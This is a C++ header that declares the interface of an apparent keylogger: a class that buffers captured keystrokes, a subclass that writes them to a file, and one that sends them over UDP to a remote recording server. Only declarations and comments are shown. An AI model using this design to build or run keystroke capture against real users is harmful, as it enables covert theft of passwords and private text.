#ifndef RECORDER_H_
#define RECORDER_H_

#include <filesystem>
#include <string>
#include <vector>

#include "io/udp/udp_socket.h"

namespace keylogger {

/*!
 * \class Recorder
 * \brief Recorder defines an interface for buffering and transmitting user
 *        keystrokes.
 */
class Recorder {
 public:
  /*!
   * \brief Construct a recorder object with a key limit of \p key_limit.
   * \param key_limit The maximum number of keys the recorder will store in
   *                  memory.
   * \throws std::runtime_error When given a zero or negative \p key_limit
   *                            value.
   */
  explicit Recorder(int key_limit);

  Recorder() = delete;
  virtual ~Recorder() = default;
  Recorder(const Recorder&) = default;
  Recorder& operator=(const Recorder&) = default;
  Recorder(Recorder&&) = default;
  Recorder& operator=(Recorder&&) = default;

  /*!
   * \brief Buffer the char \p character in memory.
   * \details Characters are buffered in memory. If the buffer limit has been
   *          reached, the buffer will be emptied via a call to Transmit() and
   *          then \p character will be added to the buffer.
   * \param character A printable character as classified by the currently
   *                  installed C locale.
   * \throws std::runtime_error When BufferKeyPress() must call Transmit() to
   *                            make room for \p character in the buffer but
   *                            Transmit() fails.
   */
  void BufferKeyPress(char character);

  /*!
   * \brief Transmit keystroke buffer contents to the recording medium.
   */
  virtual void Transmit() = 0;

 protected:
  using CharList = std::vector<char>;

  int num_keys_;  /**< Number of keystrokes currently buffered. */
  CharList keys_; /**< Keystroke char buffer. */
};

/*!
 * \class FileRecorder
 * \brief Record keystrokes to a text file.
 */
class FileRecorder : public Recorder {
 public:
  using FilePath = std::filesystem::path;

  /*!
   * \brief Construct text file keystroke recorder.
   * \param log_path Path absolute or relative to the text file that will
   *                 contain the recorded keystrokes.
   * \param key_limit The maximum number of keys the recorder will store in
   *                  memory.
   * \throws std::runtime_error When given a zero or negative \p key_limit
   *                            value.
   */
  [[nodiscard]] FileRecorder(int key_limit, const FilePath& log_path);

  FileRecorder() = delete;
  FileRecorder(const FileRecorder&) = default;
  FileRecorder& operator=(const FileRecorder&) = default;
  FileRecorder(FileRecorder&&) = default;
  FileRecorder& operator=(FileRecorder&&) = default;

  /*!
   * \brief Write the contents of the keystroke buffer to file.
   * \throws std::runtime_error When the recorder file cannot be opened for
   *                            writing.
   */
  void Transmit() final;

 private:
  FilePath log_path_; /**< Path to recorder text file. */
};

/*!
 * \class NetworkRecorder
 * \brief Transmit keystrokes over the network (UDP).
 */
class NetworkRecorder : public Recorder {
 public:
  /*!
   * \brief Construct udp socket based keystroke recorder.
   * \param key_limit The maximum number of keys the recorder will store in
   *                  memory.
   * \param ip IPv4 address of the recording server.
   * \param port The port of the recording server.
   * \throws std::runtime_error When given a zero or negative \p key_limit
   *                            value or when a socket on the specified
   *                            ip/port combination cannot be opened.
   */
  [[nodiscard]] NetworkRecorder(int key_limit, const std::string& ip, int port);

  NetworkRecorder() = delete;
  NetworkRecorder(const NetworkRecorder&) = default;
  NetworkRecorder& operator=(const NetworkRecorder&) = default;
  NetworkRecorder(NetworkRecorder&&) = default;
  NetworkRecorder& operator=(NetworkRecorder&&) = default;

  /*!
   * \brief Send the contents of the keystroke out over UDP.
   * \throws std::runtime_error When the UDP socket fails to send keystroke
   *                            data to the recorder server.
   */
  void Transmit() final;

 private:
  UdpSocket tx_socket_; /**< Transmission UDP socket. */
};

}  // namespace keylogger

#endif
